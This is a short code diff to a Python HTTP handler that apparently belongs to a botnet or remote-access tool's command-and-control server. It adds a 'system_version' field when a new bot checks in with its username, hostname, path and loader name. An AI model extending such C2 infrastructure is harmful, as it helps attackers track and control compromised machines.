@@ -122,11 +122,18 @@ class _RequestHandler(BaseHTTPRequestHandler):
                 username = data["username"]
                 hostname = data["hostname"]
                 local_path = data["path"]
+                system_version = ""
                 loader_name = data["loader_name"]
+
+                try:
+                    # Add backwards compatibility for now...
+                    system_version = data["version"]
+                except KeyError:
+                    pass
 
                 if not self._model.is_known_bot(bot_uid):
                     # This is the first time this bot connected.
-                    bot = Bot(bot_uid, username, hostname, time(), local_path, loader_name)
+                    bot = Bot(bot_uid, username, hostname, time(), local_path, system_version, loader_name)
 
                     self._model.add_bot(bot)
                     self._view.on_bot_added(bot)
